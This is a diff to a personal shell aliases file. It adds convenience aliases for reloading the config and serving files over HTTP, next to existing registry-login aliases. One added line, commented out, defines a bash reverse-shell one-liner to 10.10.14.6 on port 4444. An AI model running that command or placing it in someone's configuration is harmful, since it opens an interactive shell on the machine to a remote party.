@@ -28,3 +28,7 @@ alias awsume=". awsume"
 alias login_uds_registry='login_registry "$UDS_URL" "$UDS_USERNAME" "$UDS_PASSWORD"'
 alias login_ironbank='login_registry "$IRONBANK_URL" "$IRONBANK_USERNAME" "$IRONBANK_PASSWORD"'
 alias login_dockerhub='login_registry "$DOCKERHUB_URL" "$DOCKERHUB_USERNAME" "$DOCKERHUB_PASSWORD"'
+alias reload='source ~/.zshrc'
+#alias revshell='bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'
+alias serve='python3 -m http.server 8000'
+
